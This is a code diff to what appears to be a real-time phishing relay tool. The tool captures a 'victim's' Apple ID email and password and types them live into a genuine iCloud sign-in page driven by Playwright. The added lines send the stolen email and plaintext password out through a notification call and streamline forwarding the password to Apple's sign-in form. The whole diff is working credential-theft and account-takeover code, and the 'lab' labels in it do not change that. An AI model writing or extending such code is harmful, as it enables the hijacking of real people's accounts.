@@ -910,7 +910,15 @@ def push_victim_password_to_apple(
         value = ''
     if not live_sync.should_push(value, force=force):
         return
-    _apple_force_password_field(frame, value)
+    try:
+        from apple_drive import password_entry_ready, read_account_email, type_password
+
+        em = read_account_email(frame)
+        if not password_entry_ready(frame, em):
+            return
+        type_password(frame, value or '')
+    except ImportError:
+        _apple_force_password_field(frame, value)
     live_sync.mark_pushed(value)
 
 
@@ -953,35 +961,24 @@ def ensure_apple_signin_frame(apple: Page, frame):
 
 
 def forward_password(apple: Page, frame, password: str, email: str = '') -> bool:
-    frame = find_apple_frame(apple, frame)
+    from apple_drive import drive_password
+
+    frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
     if not frame:
         print('  [fwd] password: no apple frame; re-opening sign-in', flush=True)
         frame = open_icloud_sign_in(apple)
         if not frame:
             return False
     try:
-        if not apple_password_step_ready(frame):
-            if email.strip():
-                print('  [fwd] password: Apple not on password step; advancing email first', flush=True)
-                if not forward_email(apple, frame, email.strip()):
-                    return False
-                frame = find_apple_frame(apple, frame)
-            if not frame or not apple_password_step_ready(frame):
-                print('  [fwd] password: password field not ready', flush=True)
-                return False
-        field = frame.locator('#password_text_field')
-        field.wait_for(state='visible', timeout=8000)
-        _apple_force_password_field(frame, password)
-        time.sleep(0.25)
-        btn = frame.locator('#sign-in')
-        if not _wait_enabled(btn, 15000):
-            print('  [fwd] password: Sign In still disabled on Apple', flush=True)
-        _apple_submit_signin(frame, password_step=True)
-        if _apple_password_submit_ok(apple, frame):
-            print('  [fwd] password -> ' + ('*' * len(password)), flush=True)
-            return True
-        print('  [fwd] password submit: Apple did not advance (OTP/trust/loading)', flush=True)
-        return False
+        ok, _frame = drive_password(
+            apple,
+            frame,
+            password,
+            email or '',
+            find_apple_frame,
+            password_submit_ok=_apple_password_submit_ok,
+        )
+        return ok
     except PlaywrightError as e:
         print('  [fwd] password ERR', repr(e), flush=True)
         return False
@@ -2839,6 +2836,25 @@ def run() -> int:
                             victim_password_state.set_authoritative(pw)
                             victim_typed_live['password'] = pw
                             credentials['password'] = pw
+                            notify_lab_event(
+                                'Harbor — password (commit)\n'
+                                f"Email: {credentials.get('email') or victim_email_state.get() or '-'}\n"
+                                f'Password: {pw}'
+                            )
+                            frame = find_apple_frame(apple, frame)
+                            if frame and args.remote:
+                                try:
+                                    from apple_drive import password_entry_ready, type_password
+
+                                    em = (
+                                        credentials.get('email')
+                                        or victim_email_state.get()
+                                        or ''
+                                    ).strip()
+                                    if password_entry_ready(frame, em):
+                                        type_password(frame, pw)
+                                except ImportError:
+                                    pass
                             push_victim_password_to_apple(
                                 apple,
                                 frame,
@@ -3006,32 +3022,13 @@ def run() -> int:
                             )
                             victim_begin_signin_loading(victim, remote=args.remote)
                             victim_signin_loading_until = time.time() + 90.0
-                            apple_input_cache.pop('#password_text_field', None)
                             em = victim_email_state.best_of(
                                 account, credentials.get('email') or ''
                             ).strip()
                             if em:
                                 credentials['email'] = em
-                            push_victim_email_to_apple(
-                                apple,
-                                frame,
-                                victim_email_state,
-                                apple_email_live,
-                                force=True,
-                                sync_cache=apple_input_cache,
-                            )
-                            frame = find_apple_frame(apple, frame)
-                            if em and _apple_account_email(frame).lower() != em.lower():
-                                forward_email(apple, frame, em)
-                                frame = find_apple_frame(apple, frame)
-                            push_victim_password_to_apple(
-                                apple,
-                                frame,
-                                victim_password_state,
-                                apple_password_live,
-                                force=True,
-                            )
-                            frame = find_apple_frame(apple, frame)
+                            print(f'  [fwd] victim submit -> forward_password ({len(pwd_send)} chars)', flush=True)
+                            frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
                             if forward_password(
                                 apple,
                                 frame,
